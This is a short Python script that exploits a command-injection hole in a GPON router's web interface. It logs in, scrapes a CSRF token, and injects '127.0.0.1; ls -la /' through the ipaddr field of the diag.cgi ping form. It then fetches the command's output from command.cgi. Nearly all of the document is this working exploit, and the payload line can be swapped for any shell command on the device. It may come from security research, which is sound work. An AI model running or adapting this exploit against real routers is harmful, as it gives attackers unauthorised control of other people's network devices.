import asyncio
from browserless_gpon import GPONClient
import re
import time

client = GPONClient()
client.login()

res = client.session.get(f"{client.ip}/diag.cgi?ping")
csrf_match = re.search(r'name="csrf_token"\s+value="([^"]+)"', res.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

# The real injection payload
payload = {
    "csrf_token": csrf_token,
    "passwd_token_value": "",
    "iface": "",
    "ipaddr": "127.0.0.1; ls -la /",
    "checkall": "ping",
    "pingcount": "1",
    "packetlength": "64",
    "tracehops": "30"
}

print(f"Injecting payload: {payload['ipaddr']}")
post_res = client.session.post(f"{client.ip}/diag.cgi?ping", data=payload)
print(f"Ping form submission response: '{post_res.text}'")

# The Javascript does `$.post('command.cgi?cat+'+f)` where `f` is the data returned from the ping POST.
f = post_res.text.strip()
if not f:
    print("Router returned empty ID, injection blocked.")
else:
    print(f"Router returned output ID: {f}")
    time.sleep(2)
    poll_res = client.session.post(f"{client.ip}/command.cgi?cat+{f}")
    print("\n--- OUTPUT ---")
    print(poll_res.text)
    print("--------------")

